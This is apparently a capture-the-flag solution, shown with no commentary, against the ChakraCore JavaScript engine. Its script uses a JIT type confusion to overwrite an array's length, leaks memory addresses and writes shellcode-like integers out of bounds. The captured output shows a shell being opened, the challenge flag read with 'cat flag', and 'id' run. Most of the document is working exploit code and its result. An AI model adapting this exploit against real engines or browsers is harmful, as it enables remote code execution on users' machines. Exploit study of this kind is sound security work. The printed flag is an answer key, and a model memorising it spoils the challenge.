
Enter JS Code:
var obj_rw = {p1:1,p2:2,p3:3,p4:4};
var vul_array = [1,2,3,4];
var z = [5,6,7]


obj_rw.p5 = 5;
obj_rw.p6 = 6;
obj_rw.p7 = 7;
obj_rw.p8 = 8;
obj_rw.p9 = 9;
obj_rw.p10 = 10;
obj_rw.p11 = 11;
obj_rw.p12 = 12;

function opt(obj,obj1){
	obj.a = 3.3;
	let tmp = {__proto__:obj1};
	obj.a = obj_rw;
};

for(let i = 0; i < 0x2000;i++){
	obj_1 = {a:1,b:2,c:3,d:4};
	obj = {a:1,b:2,c:3,d:4};
	opt(obj,obj_1);
}

obj_1 = {a:1,b:2,c:3,d:5};
opt(obj_1,obj_1);
//obj_1.e = trigger_vuln_iniarray;
obj_1.e = vul_array;
obj_rw.p7 = 0x7fffffff;
obj_rw.p11 = NaN;
obj_rw.p12 = 0x7fffffff;
x = vul_array[18];
y = vul_array[19];
print(x);
print(y);

vul_array[6] = x-0x80;
vul_array[7] =y;
vul_array[26] = 1220555152;
vul_array[27] =-1768042053;
vul_array[28] =-1752379247;
vul_array[29] =-604550913;
vul_array[30] =-1721805741;
vul_array[31] =1582585682;
vul_array[32]= 84884400;
vul_array[34]= x+0x10;
vul_array[35] = y;


z.push(0);
vul_array[0x100000] = 1;
//vul_array[0x100000] = 2;
//print(vul_array[0x1000000]);
.

JS Output:
-849404800
32687
ls
bin
ch
dev
flag
lib
lib64
libChakraCore.so
tmp
cat flag
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
